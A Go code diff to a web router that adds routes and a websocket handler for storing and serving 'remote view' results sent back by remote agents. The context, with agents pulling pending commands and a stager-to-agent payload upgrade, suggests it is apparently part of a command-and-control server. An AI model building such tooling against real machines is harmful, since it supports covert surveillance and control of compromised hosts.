@@ -131,6 +131,9 @@ func InitRouter(init *config.Initialization) *gin.Engine {
 		commandRoutes.GET("/agent/:agentID/pending", init.CommandCtrl.GetPendingCommands)
 		commandRoutes.GET("/agent/:agentID/history", init.CommandCtrl.GetCommandHistory)
 		commandRoutes.POST("/clear", init.CommandCtrl.ClearAllCommands)
+
+		commandRoutes.GET("/agent/:agentID/remote_view", init.CommandCtrl.GetLatestRemoteView)
+		commandRoutes.GET("/agent/:agentID/remote_view/history", init.CommandCtrl.GetRemoteViewHistory)
 	}
 
 	/*
@@ -343,19 +346,19 @@ func InitRouter(init *config.Initialization) *gin.Engine {
 				responseBytes, _ := json.Marshal(response)
 				conn.WriteMessage(websocket.TextMessage, responseBytes)
 			} else if messageType == "remote_view_result" {
-
 				println("Remote view result received")
-				_, agentOk := message["agentId"].(string)
+				agentID, agentOk := message["agentId"].(string)
 				if !agentOk {
 					println("Invalid remote view result, no agent ID")
 					continue
 				}
 
-				_, commandOk := message["commandId"].(string)
+				commandID, commandOk := message["commandId"].(string)
 				if !commandOk {
 					println("Invalid remote view result, no command ID")
 					continue
 				}
+
 				result := message["result"]
 				// Convert result to string for storage
 				resultStr := ""
@@ -364,9 +367,34 @@ func InitRouter(init *config.Initialization) *gin.Engine {
 					if err == nil {
 						resultStr = string(resultBytes)
 					} else {
-						println("Error marshaling result:", err.Error())
+						println("Error marshaling result:", err.Error(), resultStr)
+						continue
 					}
 				}
+
+				// Store the remote view data directly in Redis
+				err = init.CommandSvc.StoreRemoteViewData(agentID, resultStr)
+				if err != nil {
+					println("Error storing remote view result:", err.Error())
+				} else {
+					println("Remote view result stored successfully in Redis")
+
+					// Try to also update command status, but don't fail if it doesn't work
+					// This is just for historical records
+					err = init.CommandSvc.UpdateCommandStatus(agentID, commandID, "completed", resultStr)
+					if err != nil {
+						println("Note: Could not update command history, but data was stored in Redis")
+					}
+				}
+
+				// Send acknowledgment
+				response := map[string]interface{}{
+					"type":      "remote_view_ack",
+					"commandId": commandID,
+					"timestamp": time.Now().Format(time.RFC3339),
+				}
+				responseBytes, _ := json.Marshal(response)
+				conn.WriteMessage(websocket.TextMessage, responseBytes)
 
 			} else if messageType == "payload_received" {
 				// Handle payload acknowledgment (stager -> agent upgrade)
